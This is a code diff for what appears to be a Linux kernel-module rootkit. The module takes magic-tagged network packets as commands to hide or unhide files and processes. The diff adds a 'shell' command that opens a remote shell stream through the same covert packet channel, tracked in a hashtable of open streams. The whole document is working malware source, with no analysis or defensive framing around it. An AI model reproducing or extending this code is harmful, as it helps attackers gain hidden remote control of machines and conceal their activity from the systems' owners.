@@ -9,6 +9,8 @@
 #include <linux/list.h>
 
 #include "headers/main.h"
+#include "headers/networking.h"
+#include "headers/shell.h"
 
 #define CMD_MAGIC ("mrk")
 #define CMD_MAGIC_LEN (strlen(CMD_MAGIC))
@@ -16,20 +18,12 @@
 #define RESPONSE_DATA_LEN (3)
 #define RESPONSE_HEADER_LEN (sizeof(struct udphdr) + sizeof(struct iphdr) + ETH_HLEN)
 
-typedef u16 job_id_t;
-
-struct origin {
-    job_id_t job_id;
-    __be32 remote_addr;
-    __be32 local_addr;
-    __be16 remote_port;
-    unsigned char remote_mac[ETH_ALEN];
-    struct net_device *dev;
-};
+static DEFINE_HASHTABLE(open_streams, 8);
 
 struct cmd_type {
     char *name;
     int (*func)(const char *path);
+    struct stream_type stream;
 };
 
 static int exit_func(const char *_) {
@@ -39,29 +33,38 @@ static int exit_func(const char *_) {
 
 struct cmd_type cmds[] = {
     {
-        "hfile",
-        hide_file
+        .name="hfile",
+        .func=hide_file
     },
     {
-        "ufile",
-        unhide_file
+        .name="ufile",
+        .func=unhide_file
     },
     {
-        "hproc",
-        hide_process
+        .name="hproc",
+        .func=hide_process
     },
     {
-        "uproc",
-        unhide_process
+        .name="uproc",
+        .func=unhide_process
     },
     {
-        "fexit",
-        exit_func
+        .name="fexit",
+        .func=exit_func
+    },
+    {
+        .name="shell",
+        .func=NULL,
+        .stream={
+            .open=open_shell,
+            .recv=recv_shell,
+            .close=close_shell
+        }
     }
 };
 
 
-static int send_response(
+int send_response(
     struct origin origin,
     char *response,
     size_t response_len
@@ -147,14 +150,31 @@ struct MRK_command_work {
 
 static void handle_command(struct work_struct *work) {
     char result[1] = {-1};
+    struct open_stream *stream;
     struct MRK_command_work *command_work = container_of(work, struct MRK_command_work, work);
-    result[0] = command_work->cmd->func(command_work->arg);
-    printk(KERN_INFO "Found %s cmd packet! executed with code %s\n", command_work->cmd->name, result);
-    send_response(
-        command_work->origin, 
-        result,
-        sizeof(result)
-    );
+    if (command_work->cmd->func == NULL) {
+        hash_for_each_possible(open_streams, stream, node, command_work->origin.job_id) {
+            if (stream->origin.job_id == command_work->origin.job_id) {
+                stream->type.recv(stream, command_work->arg, strlen(command_work->arg));
+                goto done;
+            }
+        }
+        stream = kmalloc(sizeof(struct open_stream), GFP_KERNEL);
+        stream->origin = command_work->origin;
+        stream->type = command_work->cmd->stream;
+        hash_add(open_streams, &stream->node, command_work->origin.job_id);
+        stream->type.open(stream);
+    } else {
+        result[0] = command_work->cmd->func(command_work->arg);
+        printk(KERN_INFO "Found %s cmd packet! executed with code %s\n", command_work->cmd->name, result);
+        send_response(
+            command_work->origin,
+            result,
+            sizeof(result)
+        );
+    }
+    
+done:
     // From https://github.com/torvalds/linux/blob/v5.8/kernel/workqueue.c:2173
     // It is permissible to free the struct work_struct from inside the function that is called from it.
     kfree(command_work->arg);
